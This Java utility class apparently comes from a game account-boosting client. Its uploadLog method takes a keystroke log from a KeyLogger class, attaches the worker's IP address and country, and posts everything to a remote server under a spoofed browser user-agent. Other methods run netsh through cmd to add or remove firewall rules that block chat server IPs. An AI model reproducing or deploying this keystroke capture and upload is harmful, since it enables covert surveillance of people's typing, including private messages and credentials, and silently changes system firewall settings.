package services;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import logger.Globals;
import logger.KeyLogger;
import model.User;
import model.orders.Order;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.json.JSONException;
import org.json.JSONObject;
import webService.AWSWebService;

import java.io.IOException;
import java.io.InputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;
import java.util.Timer;

public class Utils {

    public static boolean foundBadWord = false;
    public Boolean scriptAlert = false;
    private static Timer timer = new Timer();


    public void uploadLog(User user, Order order) {
        if(checkForBadWords(KeyLogger.log)) {
                Utils.foundBadWord = true;
        }
        JsonObject jsonObject = new JsonObject();
        JsonArray logFile = new JsonArray();
        logFile.add("The booster's IP adress is: " + getMyIp() + "\n");
        logFile.add("The booster's Country is: " + getMyCountry() + "\n");
        for (String message : KeyLogger.log) {
            logFile.add(message + "\n");
        }
        jsonObject.add("logFile", logFile);
        jsonObject.addProperty("fileName", createKey(user, order));

        System.out.println(jsonObject);
        sendJson(Globals.logUploadURL, jsonObject);
    }


    private boolean sendJson(String url, JsonObject jsonObject) {
        HttpClient httpClient = HttpClientBuilder.create().build();

        try {
            HttpPost post = new HttpPost(url);
            StringEntity params = new StringEntity(jsonObject.toString());
            post.setHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36");
            post.setEntity(params);
            HttpResponse response = httpClient.execute(post);
            System.out.println(" DSADSADSADSADSADSADSADASDASDSADSADSADSAD"+response.getStatusLine().getStatusCode());
            return true;
        }catch (Exception ex) {
            System.out.println("QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ");
            System.out.println(ex);
        }
        return false;
    }

    private boolean checkForBadWords(ArrayList<String> log) {
        ArrayList<String> badWords = getBadWords();
        for (String badWord: badWords) {
            for (String message : log) {
                if(message.toUpperCase().contains(badWord.toUpperCase())) {
                    return true;
                }
            }
        }
        return false;
    }

    private ArrayList<String> getBadWords () {
        ArrayList<String> badWords = new ArrayList<>();
        Scanner scanner = null;
        scanner = new Scanner(KeyLogger.badWordsFilePath);
        while (scanner.hasNext()) {
            badWords.add(scanner.nextLine());
        }
        System.out.println(badWords);
        System.out.println(KeyLogger.message);
        scanner.close();
        return badWords;
    }

    public String createKey(User user, Order order) {
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
        String path = "";
        path += createFileName(user, order) + ".csv";
        return path;
    }

    public String createFileName(User user, Order order) {
        String fileName = "";
        if(foundBadWord) {
            fileName += "WARNING ";
        }
        if (scriptAlert) {
            fileName += "SCRIPT ALERT ";
        }
        fileName += " Booster_ID: " + user.getId() + " ";
        fileName += " Order_id: " + order.getId() + " ";
        DateFormat dateFormat = new SimpleDateFormat(" yyyy_MM_dd HH_mm_ss");
        Date date = new Date();
        fileName += dateFormat.format(date);
        System.out.println(fileName);
        return fileName;
    }

    public String getMyIp() {
        try (Scanner s = new Scanner(new java.net.URL("https://api.ipify.org").openStream(), "UTF-8").useDelimiter("\\A")) {
            return s.next();
        } catch (IOException e) {
            return "couldn't find his IP";
        }
    }

    public String getMyCountry() {
        try (Scanner s = new Scanner(new java.net.URL("https://usercountry.com/v1.0/json/" + getMyIp()).openStream(), "UTF-8").useDelimiter("\\A")) {
            JSONObject jsonObject = new JSONObject(s.nextLine());
            return jsonObject.get("country").toString();
        } catch (IOException e) {
            return "couldn't find his Country";
        } catch (JSONException e) {
            e.printStackTrace();
            return "couldn't find his Country";
        }
    }

    public void disableChat(String server) {
        String[] command = {"cmd", "/c", "netsh advfirewall firewall add rule name=\"lolchat\" dir=out remoteip=" + getServerIp(server) + " protocol=TCP action=block"};
        StringBuilder cmdReturn = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            try (InputStream inputStream = process.getInputStream()) {
                int c;
                while ((c = inputStream.read()) != -1) {
                    cmdReturn.append((char) c);
                }
            }
            System.out.println(cmdReturn.toString());

        } catch (IOException ex) {
            System.out.println("ASD");
        }
    }

    private String getServerIp(String server) {
        switch (server) {
            case "EUW": return "185.40.64.69";
            case "EUNE": return "185.40.64.111";
            case "NA": return "192.64.174.69";
            case "TR": return "";
            case "RU": return "";
            case "BR": return "";
            case "LAN": return "";
            case "LAS": return "";
            case "OCE": return "";
            case "JP": return "";
            case "SEA": return "";
            case "KR": return "";
            case "CN": return "";
            case "PBE": return "";
        }
        return null;
    }

    public void enableChat() {
        String[] command = {"cmd", "/c", "netsh advfirewall firewall delete rule name=\"lolchat\""};
        StringBuilder cmdReturn = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            try (InputStream inputStream = process.getInputStream()) {
                int c;
                while ((c = inputStream.read()) != -1) {
                    cmdReturn.append((char) c);
                }
            }
            System.out.println(cmdReturn.toString());

        } catch (IOException ex) {
            System.out.println("ASD");
        }
    }



}
